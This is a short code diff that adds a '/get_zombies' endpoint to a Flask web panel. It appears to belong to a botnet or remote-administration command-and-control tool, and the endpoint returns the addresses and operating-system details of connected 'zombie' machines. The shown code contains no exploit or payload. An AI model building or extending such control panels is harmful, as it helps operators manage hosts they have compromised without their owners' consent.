@@ -4,7 +4,7 @@
 This script will be run when --web argument is set instead of gui window
 '''
 
-from flask import Flask ,request ,redirect ,render_template, Response, send_from_directory
+from flask import Flask ,request ,redirect ,render_template, Response, send_from_directory, jsonify
 import logging
 from time import sleep
 from threading import Thread
@@ -171,6 +171,20 @@ def main_web_start(use_ssl):
         from main.web.functions.zombies_web import ZombiesWeb
         zombies_web_ret = ZombiesWeb().run()
         return zombies_web_ret
+
+    @app_main.route('/get_zombies', methods=['GET'])
+    def get_zombies_url():
+
+        if ((serverModuleVar is not None) and (serverModuleVar.connection_status)):
+            zombies_addr_and_comm_list = serverModuleVar.zombies_addresses_and_communicators_list
+            temp_list = [] # store data before sending
+            for ac in zombies_addr_and_comm_list:
+                temp_list.append( [ ac[0], ac[2]['os_info'] ] )
+
+            return jsonify(temp_list)
+
+        return 'Get Zombies Request Sent'
+
 
     @app_main.route('/terminal')
     def terminal_url():
